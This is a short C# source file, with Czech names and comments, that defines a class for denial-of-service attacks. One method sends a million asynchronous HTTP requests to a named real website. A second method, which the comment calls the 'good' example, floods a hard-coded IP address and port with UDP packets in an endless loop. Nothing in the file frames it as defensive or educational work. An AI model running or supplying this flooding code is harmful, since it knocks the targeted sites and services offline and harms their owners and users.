using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace TestovaciAlgoritmy
{
    public class UtokDOS
    {
        //příklad 1 špatný
        public void VykonejDos()
        {
            for (int i = 0; i < 1000000; i++)
            {
                var request = WebRequest.CreateHttp("https://www.3dprinted.cz");
                request.BeginGetResponse(ar => {

                    using (var response = request.EndGetResponse(ar))
                    {                        
                    }
                },null);
            }
        }
        //příklad 2 dobrý
        public void VykonejDos2()
        {
            byte[] packetData = ASCIIEncoding.ASCII.GetBytes("<Data mého packetu>");
            string ip = "185.217.0.50";
            int port = 8002;
            IPEndPoint ep = new IPEndPoint(IPAddress.Parse(ip), port);
            Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            client.SendTimeout = 1;

            try
            {
                while (true)
                {
                    client.SendTo(packetData, ep);
                }
            }
            catch (Exception)
            {
                throw;
            }
           
           

        }



    }
}
